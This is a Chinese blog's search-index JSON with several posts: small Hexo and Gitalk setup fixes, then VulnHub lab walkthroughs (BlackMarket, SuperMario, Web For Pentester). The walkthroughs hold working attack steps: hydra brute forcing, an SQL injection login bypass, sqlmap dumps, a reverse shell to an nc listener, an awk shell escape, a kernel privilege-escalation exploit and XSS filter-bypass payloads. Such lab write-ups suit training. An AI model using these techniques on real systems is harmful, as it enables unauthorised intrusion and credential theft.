[{"title":"解决hexo加载不出图片的问题","url":"/2020/12/21/hexo-image/","content":"打开配置文件里的选项\n```\npost_asset_folder: true\n```\n\n安装改良后的asset-image插件\n```\nnpm install https://github.com/7ym0n/hexo-asset-image --save\n```\n\n插入图片时只能用下面的方式：\n```\n{% asset_img test.jpg test %}\n```\n\n其中test.jpg就是你要引用的图片，我这里就是test.jpg，后面的test是图片描述","tags":["hexo"],"categories":["hexo"]},{"title":"虚拟机kali开机黑屏解决办法","url":"/2020/12/20/vm-black-screen/","content":"最近打开Kali时直接黑屏，除了鼠标指针之外啥都没有，猜测可能是以下原因：\n1.\t和电脑配置有关，因为我的笔记本没有独立显卡\n2. 有可能和VM版本有关，以前都是用的14，这次是15.5\n\n最后将\"虚拟机\"->\"设置\"->\"硬件\"->\"3D图形加速\"开启后才成功进入界面。","tags":["虚拟机","kali"],"categories":["虚拟机","kali"]},{"title":"利用burp在post包中提交特殊字符","url":"/2020/12/20/burp-post/","content":"有时候我们做测试时,会需要在post包里提交特殊字符。\n方法是点击post包里的hex按钮，就能将请求内容替换成你需要的16进制字符了:\n{% asset_img post.png \"post\" %}\n想修改哪个字符,就找到对应的16进制数值,修改为目标字符即可,比如\n```\n00===null字符\n20===空格字符\n0a===换行符\n```\n\n","tags":["burp"],"categories":["burp"]},{"title":"Gitalk报错的解决方法","url":"/2020/12/20/gitalk-fix/","content":"### 前言\n前段时间用hexo+stun搭建了一个博客。这两天在弄博客的评论系统,最后选择用了Gittalk(Gitalk是一个基于Github issues的评论系统)来构建评论系统。但遇到一点小问题，如下图所示，一直提示\"Error:Not Found\"\n{% asset_img not_found.png \"Error\" %}\n所幸最后解决了,本文用于记录该问题。\n### 操作步骤\n先按照主题手册做:\n1.\t新建一个用于评论的仓库,这里我的仓库名为:Comment\n2.\t仓库settings里面开启issue评论,方法如下图:\n{% asset_img issue_open.png \"开放issue\" %}\n3. 注册一个新的GitHub Application\n首先在GitHub上注册新应用,链接地址:[注册](https://github.com/settings/applications/new)\n{% asset_img app.png \"注册app\" %}\n<font color=red>**注:**</font>因为我这儿博客域名就是用的Github默认的,xxx.github.io,所以两个是一致的,如果你用的自己的域名,则回调地址应该用自己的域名\n4.\t修改博客主题**_config.yml**\n```yaml\ngitalk:\n  # 是否启用\n  enable: ture\n  # Github 用户名\n  owner: HYSWZW\n  # 仓库名\n  repo: https://github.com/HYSWZW/Comment\n  # Github 应用程序客户端 ID,上面注册app里\n  client_id: b3620a***d71cee97eb\n  # Github 应用程序客户端密钥,上面注册app里\n  client_secret: 77aa4a3c****673c71d9775d164d300b0cfb\n  # GitHub 仓库所有者和合作者,只有这些人可以初始化 Gitalk.直接写Github 用户名即可\n  admin: HYSWZW\n  # 类似于 B 站的关灯模式\n  distraction_free_mode: true\n  # 如果你想让每一个参观你网站的人看到统一的语言，你可以在这里设置，\n  # 可选值：en, zh-CN, es-ES, fr, ru, zh-TW\n  language: zh-CN\n\n```\n修改好配置文件后,直接运行以下命令从新生成博客:\n```bash\nhexo clean && hexo g -d\n```\n结果就出现上面图片的情况了,一直显示:\"Error: Not Found\"\n{% asset_img not_found.png \"Error\" %}\n### 解决问题\n后来是将配置文件**_config.yml**里仓库名那一行改为:\n```yaml\nrepo: 仓库名 #不是仓库链接\n```\n再去仓库手动开了一个issues,最后重新生成了一遍\n```bash\nhexo clean && hexo g -d\n```\n大功告成\n{% asset_img nice.png \"成功\" %}\n--------------------------------------------------","tags":["hexo","gittalk"],"categories":["hexo","gittalk"]},{"title":"VulnHub靶机系列:BlackMarket","url":"/2020/12/14/VulnHub_BlackMarket/","content":"### 前言\n**环境:**\n靶机:192.168.41.129\nkali:192.168.41.128\n**说明:**\n这个靶机总共有6个flag和一个root flag。每个flag都指向另一个flag，flag格式为Flag{xxx}.\n**难度:**\n初级/中级\n**要点:**\n枚举、信息整合\n### 信息收集\n端口扫描：\n![端口扫描](/images/3.png)\n发现开了80web端口,访问之:\n![web页面](/images/web.png)\n查看源代码,发现第一个flag:\n![flag1](/images/flag1.png)\n看着flag格式有点熟悉呢,好像是BASE64编码的,解开得到:\n```\nCIA - Operation Treadstone\n```\n这又是什么东东,完全没听过,不过俗话说的好,遇事不决问百度,点开第一个搜索页面:\n![Treadstone](/images/Treadstone.png)\n我这小学二年级水平的外语也看不懂啊,翻译一下:\n![翻译](/images/fanyi.png)\n原来是某小说中美国中情局的一次机密行动。看完介绍我还是一脸蒙蔽，但根据以往的经验，结合目标开启了21，22端口的条件。那我们爬取一下网站内容做成一个基于目标信息的字典，说不定用于爆破有奇效呢。这里使用Kali自带的cewl进行字典收集:\n``` bash\ncewl -d 1 -w blackmarket.txt -u \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\" https://bourne.fandom.com/wiki/Operation_Treadstone\n\n-d:用于指定爬取深度,数字越大越慢,相应的字典也会越大\n-w:保存到文件\n-u:指定User-Agent头\n```\n查看生成的字典大小:![words](/images/words.png)\n7000多个单词,话不多说直接进行web页面的登录破解,用户名密码都用刚才的字典文件.\n俩小时后.....无果\n算了,先放着吧,再收集一波信息后来看,还没进行版本探测:\n![版本探测](/images/version.png)\n发现Openssh6.6,该版本是有用户名枚举的漏洞的,用上面采集的字典配合john生成新的字典:\n``` bash\njohn --wordlist=blackmarket.txt --stdout --rules > pass.txt\n```\n放在msf里跑，跑了大概一小时\n![dimitri用户](/images/dimitri.png)\n![nicky用户](/images/nick.png)\n功夫不负有心人,发现用户名*dimitri,nicky*,接下来用hydra进行ssh的爆破:\n```\nhydra -l dimitri -P pass.txt ssh://192.168.41.129\n```\n16个线程跑了整整19个小时后,还在跑,并且还需要35个小时左右,等不了了,同时开跑ftp吧,用户名用nicky,万一和SSH是同密码呢?\n``` bash\nhydra -l nicky -P blackmarket.txt ftp://192.168.41.129 -t 2\n```\n![ftp枚举](/images/ftp.png)\n线程开俩就行,因为同时还在跑上面的任务,怕给我虚拟机跑坏咯。结果出人意料的是，ftp爆破一分钟就出结果了。真是踏破铁鞋无觅处啊。\n```\nftp:nicky/CIA\n```\n赶紧登上看看，工具就用Kali自带的FileZilla,发现就只有一个文件，下载到本地：\n![登录ftp](/images/ftp_login.png)\n打开看下内容：\n![flag2](/images/flag2.png)\n发现第二个flag：\n```\nflag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}\n解开得到: Congrats Proceed Further # 恭喜你又进一步\n下面还有一句话:\nIf anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!\n如果你读到这条信息，这意味着你走在正确的道路上，但我不知道中情局黑市车辆车间。你必须找出并破解它！\n```\n### 目录枚举\n我觉得重点应该是**CIA blackmarket Vehical workshop**，但去哪里找这个玩意儿呢。先试试用这个账号登录SSH：\n``` bash\nssh nicky@192.168.41.129\n```\n提示该账号只能用于登录FTP：\n![限制登录](/images/nicky.png)\n这一步被卡了好久,但根据前面的的flag来看,上个flag都会为下一步做出提示,这次提示**CIA blackmarket Vehical workshop**。俗话说的好，想做什么立马就要行动起来。在做了很多猜想后，我将这几个关键字用john生成字典再用dirb跑了一遍\n关键字文件：其实就是用上面提示的内容\n![关键字字典](/images/keyword.png)\n然后用john生成字典：\n``` bash\njohn --wordlist=test.txt --stdout --rules > 1.txt\n```\n![字典](/images/1325.png)\n1000多个单词，话不多说开跑：\n``` bash\ndirb http://129.168.41.129 ./1.txt\n```\n啥都没跑出来.....不知道为啥，字典不对？但想来作者应该不会整的太复杂，不然没法做啊。\n**Two years later.....**\n最后试了给关键字加前缀\n![增加前缀](/images/prefix.png)\n成功跑出目录....我太难了\n![vworkshop](/images/vworkshop.png)\n好家伙，我TM直接好家伙，原来提示里面直接就给指出了目录的。**CIA blackmarket Vehical workshop**，其他单词都没首字母大写，就**Vehical**大写了，这不是疯狂暗示**vworkshop**吗，hai~，还是不够细心啊，总是后知后觉。\n### SQL注入拿到关键数据\n不管那么多先访问再说：```http://192.168.41.129/vworkshop```\n![访问目录](/images/4.png)\n东点点西点点，竟然发现登录框有SQL注入哈哈...\n```\n'OR 1#\n```\n直接进去,然后发现下面存在图片上传功能，心想登录框都能直接注入，这还不直接上传马儿getshell吗哈哈\n```\nhttp://192.168.41.129/vworkshop/spareparts.php?sparepartid=3\n```\n![上传图片](/images/5.png)\n结果捣鼓半天，发现有限制，没法直接获取shell(我太菜了...)，直接用SQLMAP一把梭吧：\n``` bash\nsqlmap -u http://192.168.41.129/vworkshop/spareparts.php?sparepartid=3\n```\n![SQLDump](/images/6.png)\n直接全部dump下来，然后发现两个关键的数据库：**BlackMarket，eworkshop**\n然后在BlackMarket库的**user**表和**flag**表找到下面的信息：\n\n|FlagId\t|name\t|Information\t\t\t\t\t|\n|--\t|--\t|--\t|\n|3\t\t|Flag\t|Find Jason Bourne Email access\t|\n\n|userid\t|access\t|username|password|解密后\t\t|\n|--\t|--\t|--\t|--\t|--\t|\n|1\t\t|1\t\t|admin\t\t|cf18233438b9e88937ea0176f1311885\t|BigBossCIA\t|\n|2\t\t|2\t\t|user\t\t|0d8d5cd06832b29560745fe4e1b941cf\t|user\t\t|\n|4\t\t|3\t\t|supplier\t|99b0e8da24e29e4ccb5d7d76e677c2ac\t|supplier\t|\n|5\t\t|2\t\t|jbourne\t|28267a2e06e312aee91324e2fe8ef1fd\t|解不出\t\t|\n|6\t\t|3\t\t|bladen\t\t|cbb8d2a0335c793532f9ad516987a41c\t|解不出\t\t|\n\n拿到第三个flag：\n```\nFind Jason Bourne Email access  # 提示需要找到Jason Bourne的邮箱地址\n```\n结合前面扫到的目录，直接用这些解密出来的账号登录blackmarket。忘了说了，前面主机探测的时候就已经扫过目录了:\n```\nGENERATED WORDS: 4612   \n---- Scanning URL: http://192.168.41.129/ ----\n==> DIRECTORY: http://192.168.41.129/admin/      \n==> DIRECTORY: http://192.168.41.129/css/        \n==> DIRECTORY: http://192.168.41.129/db/         \n==> DIRECTORY: http://192.168.41.129/dist/          \n==> DIRECTORY: http://192.168.41.129/squirrelmail/          \n==> DIRECTORY: http://192.168.41.129/supplier/   \n==> DIRECTORY: http://192.168.41.129/upload/     \n==> DIRECTORY: http://192.168.41.129/user/       \n==> DIRECTORY: http://192.168.41.129/vendor/                                      \n---- Entering directory: http://192.168.41.129/admin/\n---- Entering directory: http://192.168.41.129/squirrelmail/\n---- Entering directory: http://192.168.41.129/user/\n---- Entering directory: http://192.168.41.129/vendor/\n---- Entering directory: http://192.168.41.129/squirrelmail/class/\n---- Entering directory: http://192.168.41.129/squirrelmail/config/       \n---- Entering directory: http://192.168.41.129/squirrelmail/help/       \n---- Entering directory: http://192.168.41.129/squirrelmail/images/    \n---- Entering directory: http://192.168.41.129/squirrelmail/include/\n---- Entering directory: http://192.168.41.129/squirrelmail/locale/\n---- Entering directory: http://192.168.41.129/squirrelmail/plugins/\n---- Entering directory: http://192.168.41.129/squirrelmail/src/\n---- Entering directory: http://192.168.41.129/vendor   \n-----------------\nEND_TIME: Sun Dec  6 16:37:55 2020\nDOWNLOADED: 253660 - FOUND: 34\n```\n直接访问: \n```\nhttp://192.168.41.129/admin/\n```\n![admin_login](/images/7.png)\n试试第一个admin账户\n```\nadmin/BigBossCIA  # 成功登录,并提示:\nLogin Success, Welcome BigBOSS! here is your flag4{bm90aGluZyBpcyBoZXJl} \nJason Bourne Email access ?????\n```\n![flag4](/images/8.png)\n出现第四个flag，解码得到: 这儿啥都没有\n![nothing](/images/9.png)\n### 进入邮箱\n提示我们:**Jason Bourne Email access ?????**,按照我们之前的经验，给我们的提示一向都很准确，并且flag3中也提到Find Jason Bourne Email access，那现在的关键就是找到邮箱密码进去邮箱：\n```\nhttp://192.168.41.129/squirrelmail/\n```\n![登录邮箱](/images/10.png)\n然后又去数据库里看了看，找到了**dimitri**账户的密码**hash:28267a2e06e312aee91324e2fe8ef1fd**，但死活解不开，这可把我难住了。但转念一想，前面扫/vworkshop目录的时候，就在字里行间给了我们暗示，这次应该也会有吧，然后仔细看了看刚刚的提示：\n```\nLogin Success, Welcome BigBOSS! here is your flag4{bm90aGluZyBpcyBoZXJl} \nJason Bourne Email access ?????\n```\n盲僧，我发现了华点!注意看最后的**?????**，为啥平白无故多了几个**❓**，这也不是问句啊。有点反常，等等...莫非密码就是**?????** ?。激动地搓手手,赶紧试试:\n```\nJason Bourne/?????   #错误\nJason/?????          #错误\nBourne/?????         #错误\n.....\nJBourne/?????        # nice!!!\n```\n进去后，翻了翻有几封邮件，内容大同小异，说截取到一些俄罗斯情报但没法解密\n![邮箱](/images/11.png)\n并且找到第五个flag:\n```\nFlag5{RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=}\n```\n![信息加密](/images/12.png)\n### 破解加密邮件\n并得到提示，*一切都被加密了*。看着底下的信息确实像是以某种方式给加密了\n\n```\nSr Wrnrgir\nRu blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli rm Yozxpnzipvg\ndliphslk fmwvi /ptyyzxpwlli ulowvi blf nfhg szev gl\nKzhhKzhh.qkt rm liwvi gl szxp rm rg.\n```\n邮件里说是俄罗斯的有关情报，拿去用俄语翻译一下，发现根本不是俄语。想起以前做过一些密码相关的ctf题，看着像是凯撒密码或者栅栏密码。但两者都试了，最后都没有解出来，有点僵硬。\n这时候又到了揣摩出题人意思的地步了，仔细看了看其他几封邮件，再对比一下邮件的上下部分：\n```\nHi Bourne,\nI have intercept the message from Russian's some how we are working on same\ndirection, however, I couldn't able to decode the message.\n\nSr Wrnrgir\nRu blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli rm Yozxpnzipvg\ndliphslk blf nfhg szev gl KzhhKzhh.qkt rm liwvi gl szxp rm rg.\n```\n有木有感觉很相似呢，上面是 **Hi Bourne**，下面是**Sr Wrnrgir**，这也太像了啊。所以可以合理猜测**Sr Wrnrgir**这句话应该和**Hi Bourne**是差不多的意思，也就是**Hi=Sr**,再者**Bourne**是个人名，那**Wrnrgir**应该也是个人名，并且还是七个字母的名字。还记得前面ssh枚举出来的俩用户吗：\n```\ndimitri,nicky\n```\ndimitri刚好也是七个字母，真的这么巧合吗?我们有理由相信*Wrnrgir*==加密后的*Dimitri*，根据这些信息，推测这个加密就是使用了类似替换字符的方式进行的,并且区分大小写。我们将信息整理一下：\n```\nHi->Sr\nDimitri->Wrnrgir\n也就是\nH==S\ni==r\nD==W\nm==n\nt==g\n```\n但其他字母的替换我们并不知情，然后用这些信息我们直接去网上搜，应该有在线工具能够进行解密。用百度搜索\"字母替换解密工具\"半天找不到有用的信息(😒)，最后翻译成英文用谷歌搜索才找到，解密后如下：\n```\nhi dimitri if you are reading this i might be not alive\ni have place a backdoor in blackmarket workshop\nyou must have to passpass.jpg in order to hack in it\n提示kgbbackdoor目录下有个后门且需要找到passpass.jpg才能打开后门\n```\n手动试了几下\n```\nhttp://192.168.41.129/vworkshop/kgbbackdoor/passpass.jpg  # 404\nhttp://192.168.41.129/vworkshop/passpass.jpg              # 还是404\n```\n纳尼???仔细一看，我大意了啊。原来网站解密忽略了大小写，对照原文来看，应该是以下地址:\n```\nhttp://192.168.41.129/vworkshop/kgbbackdoor/PassPass.jpg  # 成功\n```\n![后门](/images/13.png)\n将图片下载下来，直接用文本打开先看看：\n![后门密码](/images/14.png)\n在图片末尾发现一个*Pass = 5215565757312090656*(也可以用kali自带的strings工具打开)这应该就是后门的密码了吧，就差后门地址了，美滋滋哈哈。按照加密邮件的信息简单猜测一下，是不是backdoor.php?,试试便知：\n```\nhttp://192.168.41.129/vworkshop/kgbbackdoor/backdoor.php\n```\n![访问后门](/images/15.png)\n404?研究半天没搞懂，但又觉得很奇怪，这个404页面有点不一样，Apache版本都写错了，明明是之前还是2.4.7呢。查看源代码试试,好家伙竟然有隐藏表单，这出题的大表哥太会了啊，以后我也这么隐藏马儿....\n```\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>\n<hr>\n<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at Port 80</address>\n    <style>\n        input { margin:0;background-color:#fff;border:1px solid #fff; }\n    </style>\n    <pre align=center>\n    <form method=post>\n    <input type=password name=pass>\n    </form></pre>\n```\nF12输入上面的密码*5215565757312090656*，纳尼，不会这密码也被加密了的吧，太难啦。最后捣鼓半天，原来是经过如下处理的：\n```\n5215565757312090656(10进制)---->4861696c4b474220(16进制)---->HailKGB(text)\n```\n最后密码为**HailKGB**，我拿去翻译了一下，好家伙，直接给我九头蛇万岁！\n![克格勃万岁!](/images/16.png)\n### 进入后门\nF12输入密码后,duang\\~,直接进入后门：\n![大马儿!](/images/17.png)\n哇哦\\~,界面超酷炫，我超喜欢。然后进去就是一顿翻腾，直接首页找到第六个flag也是最后一个：\n![flag6](/images/18.png)\n```\nflag6{Um9vdCB0aW1l}  # 解码得到 Root time, 看来就差最后一步提权了\n```\n### 获取root权限\n提权没有前面那么复杂，在系统上一通乱翻，发现/home/目录里有个小玩意儿(其实用脏牛也能提权)\n![小玩意儿](/images/19.png)\n上面写着：\n```\nI have been working on this CIA BlackMarket Project but it seems like I am not doing anything\nright for people. Selling drugs and guns is not my business so soon I will quit the job.\n\nAbout my personal life I am a sharp shooter have two kids,but my wife don't like me and I am broke. \nFood wise I eat everything but DimitryHateApple\n\nI will add more about later!\n```\n这系统每次给提示都不是白给的，都会有暗示在里面。仔细观察提示信息比较奇怪的点在于*DimitryHateApple*，就它最有逼格，还整点驼峰，那就是你了。真相只有一个：你就是杀人凶手！不好意思串台了，你就是Root密码！\n话不多说，先用马儿自带的功能反弹一个shell到kaili上方便操作：\n![反弹shell](/images/20.png)\n在kali上监听：\n``` bash\nnc -lvp 31337\n```\n![nc监听](/images/21.png)\n但这样没法切换到root去，得利用python弹个交互式shell(原谅我只知道用python做,应该还有其他方式):其实我试过远程xshell连接，但它并不允许远程连接--!...\n``` bash\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n然后输入DimitryHateApple，纳尼，密码竟然不对，都最后一步了都还要卖关子，不愧是你，真牛逼。\n此时此刻我聪明的小脑瓜飞速转动(其实是结合前面作者的尿性)，大胆猜测方向是肯定没错，多半哪里细节不对。然后我回去好好看了看，索德斯呢，*DimitryHateApple*中的用户名i成了y，换过来试试：*DimitriHateApple*\n![开](/images/22.png)\nNice~兄嘚，看看目录下有啥，都root了，还不是想看哪儿就看哪儿👀，哈哈\n![完结](/images/23.png)\n不要问我为啥输入的命令有重影，我虚拟机多半是近视了。\n**最后，完结撒花哈哈........**\n--------------------------------------------------\n### 结束\n**总结：**\n * 根据目标进行信息收集的字典太重要了，好几次都需要定制字典才能跑出东西\n * 利用python的pty.spawn()生成交互式shell\n * 遇到困难不要一根筋\n * 凡事多动动脑子\n\n**用到的工具：**\n * namp,cewl,hydra,john,dirb,sqlmap\n * [替换密码解密网站](https://www.boxentriq.com/)\n\n\n\n\n","tags":["靶机","VulnHub"],"categories":["靶机","VulnHub"]},{"title":"VulnHub靶机系列:SuperMario","url":"/2020/11/23/VulnHub_SuperMario/","content":"## 前言\n该靶机难度中档，一共两个flag+root权限，本次靶机的关键在于枚举。\n## 环境\n本机IP:192.168.0.101\nkali:192.168.80.129\n靶机:192.168.80.128\n## 信息收集\n端口探测:\n```bash\nnmap -sV -Pn 192.168.80.128\n```\n{% asset_img 1.png \"端口探测\"%}\n先看看8180这个端口是什么情况:\n{% asset_img 2.png \"Web\"%}\n显示是一个Nginx欢迎界面,国际惯例,使用dirbuster先跑一波目录:\n{% asset_img 3.png \"目录\"%}\n发现一个可疑目录,访问之:\n{% asset_img 4.png \"可疑目录\"%}\n发现了Apache的基于名称的虚拟主机配置文件,用于在同一台物理机上搭建多个web网站(其实我是网上搜索很久,最后在Apache官网文档才知道这是在配置什么( ╯□╰ )),配合这篇[文章](https://www.cnblogs.com/diantong/p/10907069.html)更好理解.\n为了能够访问到该域名,我们需要修改hosts,在里面添加一条记录:\n`192.168.80.128 mario.supermariohost.local`\n然后访问mario.supermariohost.local:8180,发现是一个网页版mario小游戏:\n{% asset_img 5.png \"网页版马里奥\"%}\n直接扫描目录看看:\n{% asset_img 6.png \"目录\"%}\n发现页面:\n```\ncommand.php\nmario.php\nluigi.php\n```\nmario.php不用多看,是默认页面,主要看其他两个页面。command.php好像是在执行SQL语句查询:输入用户名,返回是否存在该用户名。\n{% asset_img 7.png \"搜索页面\"%}\nluigi.php是一封信,没有什么新发现,应该暗藏玄机,但我目前没看出来,留着后续再看。\n{% asset_img 8.png \"暗藏玄机\"%}\n根据目前信息,好像能利用的点,就只有command.php,试试:\n随便输入一个用户名试一下,会返回是否找到该用户名。但多试几次好像又不对劲,同样的输入,你多试几次,会出现不一样的结果,像随机的一样。但一共只有三种结果:`用户名未找到 用户名存在 空`\n{% asset_img 9.png \"输入测试\"%}\n这三个页面我研究了好一会儿还是没发现有什么问题,最后得出结论:`很可能是出题者故意弄的坑`\n俗话说渗透无门,枚举开路.web没发现漏洞,那只能使用最粗暴的手段了。三个页面也就luigi.php有不少信息,那搜集一下luigi.php页面信息生成用户名SSH枚举的字典吧。\n这里使用kali自带的cewl进行页面单词爬取,只收集单词长度大于3的,-m 3:\n```bash\ncewl -w name.txt -d 1 -m 3 http://mario.supermariohost.local:8180/luigi.php\n```\n{% asset_img 10.png \"收集信息\"%}\n一共收集到44个关键字,然后用kali自带的工具john生成字典:\n```bash\njohn --wordlist=name.txt --stdout --rules > pass.txt\n```\n{% asset_img 11.png \"密码字典\"%}\n好,万事具备只欠东风,接下来就用hydra爆破密码,用户名为luigi:\n```bash\nhydra -l luigi -P pass.txt -f ssh://192.168.80.128 -t 3\n```\n由于线程开的很低,经过漫长的等待之后终于得到账号密码:\n**`luigi : luigi1`**\n不得不说,根据目标信息,然后生成专门的字典是很重要的,这样爆破的时候往往有奇效\n{% asset_img 12.png \"爆破结果\"%}\n得到登陆账号,废话不多说直接登录ssh\n{% asset_img 13.png \"登录ssh\"%}\n登上去后,提示shell受限,输入?或者help获取允许执行的命令,那我们看看允许执行哪些命令呢?根据提示输入**?**\n{% asset_img 14.png \"?\"%}\n只允许执行以下命令:\n```bash\nawk cat cd clear echo exit help history ll lpath ls lsudo vim\n```\n但说不让执行就不能执行?偏要试一试其他命令:\n{% asset_img 15.png \"很好\"%}\n果然没骗我,其他命令都禁止执行。但在允许执行的命令中竟然有awk,话说我个菜鸡awk都没怎么用过,随手百度了一下:说awk是一种强大的文本处理工具。竟然都说到很强大了,那执行个命令不过分吧:\n```bash\nawk 'BEGIN {system(\"/bin/sh\")}'\n成功利用awk突破了shell限制\n```\n{% asset_img 16.png \"awk执行命令\"%}\n查看linux内核版本(kali连接靶机SSH):\n```bash\nuname -a\n```\n{% asset_img 17.png \"内核版本\"%}\n内核版本不是太高,应该能找到exp,由于靶机不通外网,因此我先将exp下载到kail,然后再scp下载到靶机上,本次提权使用的是[CVE-2015-1328](https://github.com/SecWiki/linux-kernel-exploits/blob/master/2015/CVE-2015-1328/37292.c)\n```bash\nscp root@192.168.80.129:/root/tmp/ofs.c ofs.c  #下载exp\ngcc ofs.c -o ofs  #编译并运行exp:\nchmod a+x ofs\n/ofs\n```\n成功提权到root,个人不喜欢用sh,使用bash吧。\n那么现在的任务就是找到靶机上的两个flag。切换到root目录发现一个flag.zip的压缩文件:\n{% asset_img 18.png \"zip文件\"%}\n解压缩:\n```bash\nunzip flag.zip\n```\n发现被加密了,将该zip包放到kali上,找找kali上用于枚举zip包密码的工具：\n```bash\napropos 或者 man -k\n搜索能够破解zip密码的工具\n这两个命令可在一些特定的包含系统命令的简短描述的数据库文件里查找关键字，然后把结果输出\n```\n{% asset_img 19.png \"破解zip工具\"%}\n到一个fcrackzip好像能够进行zip密码破解,下面是用法:\n```bash\nUSAGE: fcrackzip\n          [-b|--brute-force]            use brute force algorithm\n          [-D|--dictionary]             use a dictionary\n          [-B|--benchmark]              execute a small benchmark\n          [-c|--charset characterset]   use characters from charset\n          [-h|--help]                   show this message\n          [--version]                   show the version of this program\n          [-V|--validate]               sanity-check the algortihm\n          [-v|--verbose]                be more verbose\n          [-p|--init-password string]   use string as initial password/file\n          [-l|--length min-max]         check password with length min to max\n          [-u|--use-unzip]              use unzip to weed out wrong passwords\n          [-m|--method num]             use method number \"num\" (see below)\n          [-2|--modulo r/m]             only calculcate 1/m of the password\n          file...                    the zipfiles to crack\nmethods compiled in (* = default):\n0: cpmask\n1: zip1\n*2: zip2, USE_MULT_TAB\n```\nkali是有自带字典的,在/usr/share/wordlists中,名为rockyou.txt.gz。解压后进行密码破解:\n```bash\ngunzip rockyou.txt.gz  # 解压缩\nfcrackzip -uv -D -p /usr/share/wordlist/rockyou.txt flag.zip\n```\n{% asset_img 20.png \"破解zip密码\"%}\n解压密码:**`ilovepeach`** 。再次感叹,爆破猜解真是简单粗暴!解压看下内容:\n{% asset_img 21.png \"flag内容\"%}\n内容大概意思是需要将全部用户的口令找到才算完全过关。老规矩,这里还是使用john进行hash猜解,不过字典得重新生成一下(别问,问就是我不将压缩密码加进去没跑出来。囧),首先用于生成字典的单词我们要加上一个刚刚得到的压缩包密码`ilovepeach`:\n```bash\necho ilovepeache >> name.txt\ntail name.txt\n```\n{% asset_img 22.png \"增加密码\"%}\n使用john生成字典:\n```bash\njohn --wordlist=name.txt --stdout --rules > hash.txt\ncat hash.txt | wc -l\n```\n一共生成了2306条密码\n{% asset_img 23.png \"构造字典\"%}\n不得不说,john真是个神器不光能用来生成字典,更能用来跑hash,但由于是虚拟机且本菜鸡电脑实在太垃圾,内存还不够,导致下面这种结果。\n{% asset_img 24.png \"垃圾电脑毁我青春\"%}\n不过好在本机windows上安装了pentestbox,自带john\n先将kali上生成的字典传到本机上,方法很多,可以用python,scp,nc等等，然后开始破解:\n{% asset_img 25.png \"破解hash\"%}\n不得不说一句,john牛逼,获得密码:\n```\nilovepeach!\nilovepeach!\n```\n话说两个密码hash都不一样,解出来竟然是一样的密码(其实是盐值不一样)。不会是错的吧,试一试:\n{% asset_img 26.png \"得到密码\"%}\n验证成功完全没问题嘿嘿。\n那到这里,耗时一周多的超级马里奥靶机渗透之旅就结束啦。\n--------------------------------------------------\n**PS:**\n回到第一步,端口和服务探测那里,我们看OpenSSH版本是6.6.1,该版本其实是存在用户名枚举漏洞的,即[CVE-2018-15473](https://github.com/trimstray/massh-enum)\n{% asset_img 27.png \"ssh用户名枚举\"%}\n用法:\n```bash\nmassh-enum --hosts 192.168.80.128 --users wordlists/users\n```\n也可以用msf自带的ssh枚举模块枚举出用户:\n```bash\nuse auxiliary/scanner/ssh/ssh_enumusers\n\n设置目标ip\nset rhost 192.168.80.128\n\n设置用户名文件,这里可以用前面cewl在luigi.php页面收集到的单词字典,也可以枚举单个用户\n本次演示,就使用单个用户以节约时间:\nset username mario\n其他选项默认即可\n```\n{% asset_img 28.png \"msf_ssh用户名枚举\"%}\n--------------------------------------------------\n## 总结\n本次靶机渗透完全诠释了信息收集和信息整合利用的重要性,不论是第一步的SSH用户名枚举、还是用cewl爬取luigi.php页面然后john生成社工字典、还有最后破解出flag.zip压缩密码然后将其整合进单词字典再重新生成用于破解hash的密码,这些都是渗透中的细节,少做一步,可能目标就很难被拿下。\n此次靶机渗透知识点:\n* 增加Apache搭建两个不同站点,虚拟主机的了解\n\t* 有三种方法：\n\t\t1.\t通过不同的IP地址   \n\t\t2.\t通过不同的域名　\n\t\t3.\t通过不同的端口号\n* 使用两款强大的hash破解工具:John the Ripper & hashcat\n* 学会zip破解工具fcrackzip的用法\n* 了解到awk文本处理语言的基本用法\n* 信息收集、整合真的很重要\n* 没有头绪的时候,枚举会给你带来惊喜,不过针对目标的字典不能少\n\n\n","tags":["靶机","VulnHub"],"categories":["靶机","VulnHub"]},{"title":"VulnHub靶机系列:Web For Pentester","url":"/2020/11/15/VulnHub_WebForPentester/","content":"## 前言\n本文是VulnHub靶机Web For Pentester的部分write up。一共有三部分:XSS篇、LDAP篇、XXE篇。\n## XSS篇\n`Example1 write-up:`\n```html\nname=<script>alert(/xss/)</script>\n```\n\n`Example2 write-up:`\n```html\n大写绕过 name=<Script>alert(/xss/)</Script>\n```\n\n`Example3 write-up:`\n```html\n双写绕过 name=<scrip<script>t>alert(/xss/)</scri</script>pt>\n```\n\n`Example4 write-up:`\n```html\n使用img标签 \nname=<img src=\"x\" onerror=alert(1)>\n```\n\n`Example5 write-up:`\n```html\nalert被过滤使用confirm替代 \nname=<svg/onload=confirm(0)>\n```\n\n`Example6 write-up:`\n```html\n闭合前面的 <script>标签 </script><svg/onload=alert(0)>\n或     者 <svg/onload=alert(0)>\";document.write($a)//\n```\n\n`Example7 write-up:`\n使用htmlentities()特殊字符进行html实体转换，但默认只处理双引号，因此闭合前面的单引号再注释后面的单引号即可。\n```html\nname=';alert(0)//\n```\n## LDAP篇\n### Example1 :\n和SQL注入一样,LDAP进行查询的时候也会有相对固定的一套查询语句,并且支持逻辑符号`(&,|,!,=)`,还支持通配符`*`\n\n**常用的查询语法:**\n<font color=\"#FF7F50\">=(等于)</font>\n查找Name属性为John的所有对象\n(Name=John)\n这条语句会返回name为john的所有对象\n\n<font color=\"#FF7F50\">&(逻辑与)</font>\n如果具有多个条件，并且希望所有条件都能满足，则使用该语法\n(&(Name=John)(live=Dallas))\n以上语句查询居住在Dallas，并且名为John的所有人员\n\n<font 